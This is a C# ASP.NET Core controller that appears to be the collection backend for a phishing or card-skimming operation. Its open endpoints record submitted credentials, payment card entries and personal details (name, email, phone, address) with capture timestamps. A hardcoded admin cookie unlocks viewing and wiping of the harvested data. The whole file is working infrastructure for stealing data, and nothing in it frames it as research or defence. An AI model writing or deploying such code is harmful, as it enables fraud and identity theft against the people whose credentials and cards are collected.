using Data;
using Microsoft.AspNetCore.Mvc;
using System.Text.Json;

namespace WebApiSolution.Controllers;

[ApiController]
[Route("api/log")]
public class LogController(AppDbContext db) : ControllerBase
{
    private const string CookieName = "admin_tok";
    private const string CookieValue = "ts2026_ok";

    private bool IsAuthorized()
        => Request.Cookies.TryGetValue(CookieName, out var v) && v == CookieValue;

    [HttpPost]
    public async Task<IActionResult> LogCredentials([FromBody] LogEntry entry)
    {
        entry.CapturedAt = DateTime.UtcNow;
        db.LogEntries.Add(entry);
        await db.SaveChangesAsync();
        return Ok();
    }

    [HttpPost("card")]
    public async Task<IActionResult> LogCard([FromBody] CardEntry entry)
    {
        entry.CapturedAt = DateTime.UtcNow;
        db.CardEntries.Add(entry);
        await db.SaveChangesAsync();
        return Ok();
    }

    [HttpPost("pinfo")]
    public async Task<IActionResult> LogPersonalInfo([FromBody] JsonElement body)
    {
        var entry = new PersonalInfoEntry
        {
            FirstName = body.TryGetProperty("firstName", out var fn) ? fn.GetString() : null,
            LastName = body.TryGetProperty("lastName", out var ln) ? ln.GetString() : null,
            Email = body.TryGetProperty("email", out var em) ? em.GetString() : null,
            Phone = body.TryGetProperty("phone", out var ph) ? ph.GetString() : null,
            Address = body.TryGetProperty("address", out var ad) ? ad.GetString() : null,
            City = body.TryGetProperty("city", out var ct) ? ct.GetString() : null,
            RawJson = body.GetRawText(),
            CapturedAt = DateTime.UtcNow
        };
        db.PersonalInfoEntries.Add(entry);
        await db.SaveChangesAsync();
        return Ok();
    }

    [HttpGet("admin")]
    public async Task<IActionResult> GetAll()
    {
        if (!IsAuthorized()) return Unauthorized(new { message = "Unauthorized" });

        var credentials = db.LogEntries.OrderByDescending(x => x.CapturedAt).ToList();
        var cards = db.CardEntries.OrderByDescending(x => x.CapturedAt).ToList();
        var personal = db.PersonalInfoEntries.OrderByDescending(x => x.CapturedAt).ToList();

        return Ok(new { credentials, cards, personal });
    }

    [HttpDelete("admin/clear")]
    public async Task<IActionResult> Clear()
    {
        if (!IsAuthorized()) return Unauthorized(new { message = "Unauthorized" });

        db.LogEntries.RemoveRange(db.LogEntries);
        db.CardEntries.RemoveRange(db.CardEntries);
        db.PersonalInfoEntries.RemoveRange(db.PersonalInfoEntries);
        await db.SaveChangesAsync();
        return Ok();
    }
}
